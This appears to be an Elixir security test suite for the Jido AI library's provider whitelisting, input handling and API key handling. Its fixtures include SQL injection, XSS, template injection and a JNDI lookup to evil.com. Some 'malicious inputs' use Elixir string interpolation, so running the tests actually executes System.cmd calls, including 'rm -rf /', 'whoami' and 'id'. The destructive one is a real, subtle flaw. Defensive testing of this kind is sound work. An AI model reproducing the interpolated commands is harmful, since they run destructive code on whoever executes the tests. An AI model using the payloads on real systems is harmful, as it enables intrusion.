defmodule JidoTest.AI.SecurityValidationTest do
  use ExUnit.Case, async: false
  use Mimic

  @moduletag :capture_log

  alias Jido.AI.Actions.OpenaiEx
  alias Jido.AI.Actions.OpenaiEx.Embeddings
  alias Jido.AI.Actions.OpenaiEx.TestHelpers
  alias Jido.AI.Model
  alias Jido.AI.ReqLlmBridge
  alias Jido.AI.ReqLlmBridge.ProviderMapping
  alias ReqLLM.Provider.Generated.ValidProviders

  # Add global mock setup
  setup :set_mimic_global

  setup do
    # Copy the modules we need to mock
    Mimic.copy(ReqLLM)
    Mimic.copy(JidoKeys)
    Mimic.copy(ValidProviders)

    :ok
  end

  describe "arbitrary atom creation prevention" do
    test "extract_provider_from_reqllm_id prevents arbitrary atom creation in OpenaiEx" do
      expect(ValidProviders, :list, fn ->
        # Known safe providers
        [:openai, :anthropic, :google]
      end)

      # Test with malicious input that could create arbitrary atoms
      malicious_inputs = [
        "malicious_atom:model",
        "'; DROP TABLE users; --:model",
        "admin:model",
        "system:model",
        "eval_me:model",
        "#{System.cmd("rm", ["-rf", "/"])}:model"
      ]

      Enum.each(malicious_inputs, fn malicious_input ->
        result = TestHelpers.extract_provider_from_reqllm_id(malicious_input)

        # Should return nil for invalid providers
        assert result == nil

        # Verify no arbitrary atoms were created by checking they don't exist
        provider_part = malicious_input |> String.split(":") |> hd()

        # This should raise if the atom was created
        assert_raise ArgumentError, fn ->
          String.to_existing_atom(provider_part)
        end
      end)
    end

    test "extract_provider_from_reqllm_id prevents arbitrary atom creation in Embeddings" do
      expect(ValidProviders, :list, fn ->
        [:openai, :anthropic, :google]
      end)

      # Create model with malicious provider
      model = %{
        reqllm_id: "malicious_provider" <> ":" <> "text-embedding-ada-002",
        api_key: "test-key"
      }

      params = %{model: model, input: ["test"]}

      expect(ReqLLM, :embed_many, fn _reqllm_id, _input, _opts ->
        {:ok, %{embeddings: [[0.1, 0.2]]}}
      end)

      # Should not call JidoKeys.put for invalid provider (prevents atom creation)
      expect(JidoKeys, :put, 0, fn _provider, _key -> :ok end)

      assert {:ok, _response} = Embeddings.run(params, %{})

      # Verify malicious atom wasn't created
      assert_raise ArgumentError, fn ->
        String.to_existing_atom("malicious_provider")
      end
    end

    test "provider mapping validates against whitelist safely" do
      expect(ValidProviders, :list, fn ->
        [:openai, :anthropic, :google, :openrouter]
      end)

      # Test provider mapping with various inputs
      test_cases = [
        # Valid
        {"openai:gpt-4", :openai},
        # Valid
        {"anthropic:claude-3", :anthropic},
        # Invalid - should not create atom
        {"unknown_provider:model", nil},
        # Malformed
        {"':model", nil},
        # Empty
        {"", nil},
        # Only colons
        {"::", nil},
        # SQL injection attempt
        {"hack_attempt:'; DROP TABLE providers; --", nil}
      ]

      Enum.each(test_cases, fn {input, expected} ->
        result = ProviderMapping.extract_provider_from_reqllm_id(input)

        if expected do
          assert {:ok, provider} = result
          assert provider == expected
        else
          assert {:error, _reason} = result
        end
      end)
    end

    test "ReqLLM integration respects provider whitelist" do
      expect(ValidProviders, :list, fn ->
        # Limited whitelist
        [:openai, :anthropic]
      end)

      # Test with non-whitelisted provider
      model = %{reqllm_id: "google" <> ":" <> "gemini-pro", api_key: "test-key"}
      params = %{model: model, input: ["test"]}

      expect(ReqLLM, :embed_many, fn _reqllm_id, _input, _opts ->
        {:ok, %{embeddings: [[0.1, 0.2]]}}
      end)

      # Should not set up keys for non-whitelisted provider
      expect(JidoKeys, :put, 0, fn _provider, _key -> :ok end)

      assert {:ok, _response} = Embeddings.run(params, %{})

      # Verify google atom wasn't created outside whitelist context
      # (Note: :google might already exist as it's a common atom, but we verify our code didn't create arbitrary ones)
    end
  end

  describe "input validation and sanitization" do
    test "validates model structure in OpenaiEx" do
      invalid_models = [
        nil,
        "string_model",
        123,
        %{invalid: "structure"},
        # Missing reqllm_id
        %{reqllm_id: nil},
        # Empty reqllm_id
        %{reqllm_id: ""}
      ]

      Enum.each(invalid_models, fn invalid_model ->
        params = %{model: invalid_model, messages: [%{role: :user, content: "test"}]}

        # Should handle invalid models gracefully
        result = OpenaiEx.run(params, %{})
        assert {:error, _reason} = result
      end)
    end

    test "validates model structure in Embeddings" do
      invalid_models = [
        nil,
        "string_model",
        123,
        %{invalid: "structure"},
        # Missing reqllm_id
        %{reqllm_id: nil, api_key: "key"}
      ]

      Enum.each(invalid_models, fn invalid_model ->
        params = %{model: invalid_model, input: ["test"]}

        result = Embeddings.run(params, %{})
        assert {:error, reason} = result
        assert is_binary(reason)
      end)
    end

    test "sanitizes message content in chat requests" do
      # Create model for testing
      {:ok, model} = Model.from({:openai, [model: "gpt-4", api_key: "test-key"]})
      model = %{model | reqllm_id: "openai" <> ":" <> "gpt-4"}

      # Test with potentially dangerous message content
      dangerous_messages = [
        [%{role: :user, content: "'; DROP TABLE messages; --"}],
        [%{role: :user, content: "<script>alert('xss')</script>"}],
        [%{role: :user, content: "#{System.cmd("whoami", [])}"}],
        # Very long input
        [%{role: :user, content: String.duplicate("A", 100_000)}]
      ]

      expect(ValidProviders, :list, fn -> [:openai] end)
      expect(JidoKeys, :put, fn _provider, _key -> :ok end)

      Enum.each(dangerous_messages, fn messages ->
        params = %{model: model, messages: messages}

        expect(ReqLLM, :generate_text, fn converted_messages, _reqllm_id, _opts ->
          # Verify messages are properly converted, not executed
          assert is_list(converted_messages)
          assert length(converted_messages) == 1
          message = hd(converted_messages)
          assert Map.has_key?(message, :role)
          assert Map.has_key?(message, :content)

          {:ok, %{content: "Safe response"}}
        end)

        assert {:ok, _response} = OpenaiEx.run(params, %{})
      end)
    end

    test "validates input strings in embeddings" do
      {:ok, model} = Model.from({:openai, [model: "text-embedding-ada-002", api_key: "test-key"]})
      model = %{model | reqllm_id: "openai" <> ":" <> "text-embedding-ada-002"}

      # Test with potentially dangerous input
      dangerous_inputs = [
        ["'; DROP TABLE embeddings; --"],
        ["<script>alert('xss')</script>"],
        # Very long input
        [String.duplicate("A", 100_000)],
        # Binary data
        ["\0\1\2\3\4\5"],
        # Command injection attempt
        ["#{System.cmd("id", [])}"]
      ]

      expect(ValidProviders, :list, fn -> [:openai] end)
      expect(JidoKeys, :put, fn _provider, _key -> :ok end)

      Enum.each(dangerous_inputs, fn input ->
        params = %{model: model, input: input}

        expect(ReqLLM, :embed_many, fn _reqllm_id, input_list, _opts ->
          # Verify input is properly handled as strings, not executed
          assert is_list(input_list)
          assert length(input_list) == 1
          assert is_binary(hd(input_list))

          {:ok, %{embeddings: [[0.1, 0.2, 0.3]]}}
        end)

        assert {:ok, _response} = Embeddings.run(params, %{})
      end)
    end

    test "handles malformed reqllm_id formats safely" do
      expect(ValidProviders, :list, fn -> [:openai, :anthropic] end)

      malformed_ids = [
        # Empty
        "",
        # No separator
        "no_colon",
        # Empty provider
        ":no_provider",
        # Empty model
        "provider:",
        # Multiple colons
        ":::",
        # Too many parts
        "provider:model:extra",
        # Nil value
        nil
      ]

      Enum.each(malformed_ids, fn reqllm_id ->
        result =
          if reqllm_id do
            TestHelpers.extract_provider_from_reqllm_id(reqllm_id)
          else
            nil
          end

        # Should handle malformed IDs gracefully
        assert result == nil
      end)
    end

    test "prevents buffer overflow in large responses" do
      {:ok, model} = Model.from({:openai, [model: "gpt-4", api_key: "test-key"]})
      model = %{model | reqllm_id: "openai" <> ":" <> "gpt-4"}

      params = %{
        model: model,
        messages: [%{role: :user, content: "Generate a large response"}]
      }

      expect(ValidProviders, :list, fn -> [:openai] end)
      expect(JidoKeys, :put, fn _provider, _key -> :ok end)

      # Simulate very large response from ReqLLM
      # 10MB response
      large_content = String.duplicate("A", 10_000_000)

      expect(ReqLLM, :generate_text, fn _messages, _reqllm_id, _opts ->
        {:ok, %{content: large_content}}
      end)

      # Should handle large responses without crashing
      assert {:ok, response} = OpenaiEx.run(params, %{})

      assert String.length(get_in(response, [:choices, Access.at(0), :message, :content])) >
               1_000_000
    end
  end

  describe "API key management security" do
    test "API keys are not logged or exposed in errors" do
      {:ok, model} = Model.from({:openai, [model: "gpt-4", api_key: "secret-api-key-12345"]})
      model = %{model | reqllm_id: "openai" <> ":" <> "gpt-4"}

      params = %{model: model, messages: [%{role: :user, content: "test"}]}

      expect(ValidProviders, :list, fn -> [:openai] end)
      expect(JidoKeys, :put, fn _provider, _key -> :ok end)

      # Simulate error that could potentially leak API key
      expect(ReqLLM, :generate_text, fn _messages, _reqllm_id, _opts ->
        {:error, %{message: "API key validation failed", details: "authentication error"}}
      end)

      expect(ReqLLM, :map_error, fn {:error, error} ->
        # Verify API key is not included in error details
        error_string = inspect(error)
        refute String.contains?(error_string, "secret-api-key-12345")
        {:error, "Authentication failed"}
      end)

      assert {:error, error_msg} = OpenaiEx.run(params, %{})

      # Verify API key is not in error message
      refute String.contains?(error_msg, "secret-api-key-12345")
    end

    test "API keys are stored securely via JidoKeys" do
      {:ok, model} = Model.from({:openai, [model: "gpt-4", api_key: "secure-key-789"]})
      model = %{model | reqllm_id: "openai" <> ":" <> "gpt-4"}

      params = %{model: model, messages: [%{role: :user, content: "test"}]}

      expect(ValidProviders, :list, fn -> [:openai] end)
      expect(ReqLlmBridge.Keys, :env_var_name, fn :openai -> "OPENAI_API_KEY" end)

      # Verify secure storage via JidoKeys
      expect(JidoKeys, :put, fn env_var, api_key ->
        assert env_var == "OPENAI_API_KEY"
        assert api_key == "secure-key-789"
        :ok
      end)

      expect(ReqLLM, :generate_text, fn _messages, _reqllm_id, _opts ->
        {:ok, %{content: "Response"}}
      end)

      assert {:ok, _response} = OpenaiEx.run(params, %{})

      # Verify the secure storage call was made
      # assert_called(JidoKeys.put("OPENAI_API_KEY", "secure-key-789"))
    end

    test "handles missing API keys securely" do
      model = %{reqllm_id: "openai" <> ":" <> "gpt-4", api_key: nil}
      params = %{model: model, messages: [%{role: :user, content: "test"}]}

      expect(ReqLLM, :generate_text, fn _messages, _reqllm_id, _opts ->
        {:ok, %{content: "Response"}}
      end)

      # Should not attempt to store nil API key
      expect(JidoKeys, :put, 0, fn _env_var, _key -> :ok end)

      assert {:ok, _response} = OpenaiEx.run(params, %{})
    end

    test "validates API key format before storage" do
      test_cases = [
        # Empty string
        {"", false},
        # Whitespace only
        {"   ", false},
        # Too short
        {"short", false},
        # Valid OpenAI format
        {"sk-" <> String.duplicate("a", 45), true},
        # Valid general format
        {"valid-api-key-format", true},
        # Nil value
        {nil, false}
      ]

      Enum.each(test_cases, fn {api_key, should_store} ->
        model = %{reqllm_id: "openai" <> ":" <> "gpt-4", api_key: api_key}
        params = %{model: model, messages: [%{role: :user, content: "test"}]}

        expect(ValidProviders, :list, fn -> [:openai] end)

        if (should_store and api_key) && String.trim(api_key) != "" do
          expect(ReqLlmBridge.Keys, :env_var_name, fn :openai -> "OPENAI_API_KEY" end)
          expect(JidoKeys, :put, fn _env_var, _key -> :ok end)
        else
          expect(JidoKeys, :put, 0, fn _env_var, _key -> :ok end)
        end

        expect(ReqLLM, :generate_text, fn _messages, _reqllm_id, _opts ->
          {:ok, %{content: "Response"}}
        end)

        assert {:ok, _response} = OpenaiEx.run(params, %{})
      end)
    end
  end

  describe "provider whitelist validation" do
    test "only allows whitelisted providers" do
      whitelisted_providers = [:openai, :anthropic, :google]

      expect(ValidProviders, :list, fn -> whitelisted_providers end)

      # Test valid providers
      valid_cases = [
        "openai:gpt-4",
        "anthropic:claude-3",
        "google:gemini-pro"
      ]

      Enum.each(valid_cases, fn reqllm_id ->
        result = TestHelpers.extract_provider_from_reqllm_id(reqllm_id)
        expected_provider = reqllm_id |> String.split(":") |> hd() |> String.to_atom()
        assert result == expected_provider
      end)

      # Test invalid providers
      invalid_cases = [
        # Not in whitelist
        "openrouter:model",
        "custom_provider:model",
        "malicious:model",
        "unknown:model"
      ]

      Enum.each(invalid_cases, fn reqllm_id ->
        result = TestHelpers.extract_provider_from_reqllm_id(reqllm_id)
        assert result == nil
      end)
    end

    test "whitelist is enforced at runtime" do
      # Test that the whitelist can change at runtime
      # Only OpenAI allowed
      expect(ValidProviders, :list, fn -> [:openai] end)

      # Should work for OpenAI
      result1 = TestHelpers.extract_provider_from_reqllm_id("openai:gpt-4")
      assert result1 == :openai

      # Should not work for Anthropic (not in current whitelist)
      result2 = TestHelpers.extract_provider_from_reqllm_id("anthropic:claude-3")
      assert result2 == nil

      # Now expand whitelist
      expect(ValidProviders, :list, fn -> [:openai, :anthropic] end)

      # Now Anthropic should work
      result3 = TestHelpers.extract_provider_from_reqllm_id("anthropic:claude-3")
      assert result3 == :anthropic
    end

    test "empty whitelist prevents all providers" do
      # No providers allowed
      expect(ValidProviders, :list, fn -> [] end)

      test_providers = ["openai:gpt-4", "anthropic:claude-3", "google:gemini"]

      Enum.each(test_providers, fn reqllm_id ->
        result = TestHelpers.extract_provider_from_reqllm_id(reqllm_id)
        assert result == nil
      end)
    end
  end

  describe "injection attack prevention" do
    test "prevents ReqLLM ID injection" do
      # Test various injection attempts in ReqLLM IDs
      injection_attempts = [
        "openai'; DELETE FROM models; --:gpt-4",
        "openai\"; system('rm -rf /'); \":gpt-4",
        "openai:gpt-4'; UPDATE users SET admin=true; --",
        "#{elem(System.cmd("whoami", []), 0)}:model",
        "{{config.secret_key}}:model",
        "${jndi:ldap://evil.com/a}:model"
      ]

      expect(ValidProviders, :list, fn -> [:openai, :anthropic, :google] end)

      Enum.each(injection_attempts, fn malicious_id ->
        result = TestHelpers.extract_provider_from_reqllm_id(malicious_id)

        # Should safely return nil for malicious inputs
        assert result == nil

        # Verify no code execution occurred by checking the provider part
        provider_part = malicious_id |> String.split(":") |> hd()

        # If it contains injection chars, it should be safely rejected
        injection_chars = ["'", "\"", ";", "${", "\#{", "{{"]

        if Enum.any?(injection_chars, &String.contains?(provider_part, &1)) do
          assert result == nil
        end
      end)
    end

    test "prevents tool injection in function calls" do
      {:ok, model} = Model.from({:openai, [model: "gpt-4", api_key: "test-key"]})
      model = Map.put(model, :reqllm_id, "openai" <> ":" <> "gpt-4")

      # Test with malicious tool calls
      malicious_tools = [
        %{type: "function", function: %{name: "'; DROP TABLE tools; --", arguments: "{}"}},
        %{
          type: "function",
          function: %{name: "eval", arguments: ~s[{"code": "system('rm -rf /')"}]}
        },
        %{
          type: "function",
          function: %{name: "normal_tool", arguments: ~s[{"param": "'; DELETE FROM data; --"}]}
        }
      ]

      params = %{
        model: model,
        messages: [%{role: :user, content: "Use tools"}],
        tools: malicious_tools
      }

      expect(ValidProviders, :list, fn -> [:openai] end)
      expect(JidoKeys, :put, fn _provider, _key -> :ok end)

      expect(ReqLLM, :generate_text, fn _messages, _reqllm_id, opts ->
        # Verify tools are passed through safely without execution
        opts_map = Enum.into(opts, %{})
        assert Map.has_key?(opts_map, :tools)
        assert is_list(opts_map.tools)

        {:ok, %{content: "Tools received safely"}}
      end)

      assert {:ok, _response} = OpenaiEx.run(params, %{})
    end
  end

  describe "memory safety and limits" do
    test "handles excessive input sizes safely" do
      {:ok, model} = Model.from({:openai, [model: "text-embedding-ada-002", api_key: "test-key"]})
      model = %{model | reqllm_id: "openai" <> ":" <> "text-embedding-ada-002"}

      # Test with very large input
      large_input = Enum.map(1..1000, fn i -> String.duplicate("A", 1000) end)
      params = %{model: model, input: large_input}

      expect(ValidProviders, :list, fn -> [:openai] end)
      expect(JidoKeys, :put, fn _provider, _key -> :ok end)

      expect(ReqLLM, :embed_many, fn _reqllm_id, input_list, _opts ->
        # Should handle large inputs without crashing
        assert is_list(input_list)
        # May batch the input
        assert length(input_list) <= 1000

        {:ok, %{embeddings: Enum.map(input_list, fn _ -> [0.1, 0.2, 0.3] end)}}
      end)

      # Should not crash or consume excessive memory
      assert {:ok, response} = Embeddings.run(params, %{})
      assert is_list(response.embeddings)
    end

    test "prevents stack overflow in nested data" do
      # Create deeply nested structure
      deeply_nested =
        Enum.reduce(1..1000, %{}, fn i, acc ->
          %{"level_#{i}" => acc}
        end)

      chunk = %{
        content: "test",
        nested_data: deeply_nested,
        role: "assistant"
      }

      # Should handle deeply nested data without stack overflow
      result = ReqLlmBridge.transform_streaming_chunk(chunk)

      assert result.content == "test"
      assert result.delta.role == "assistant"
    end
  end
end
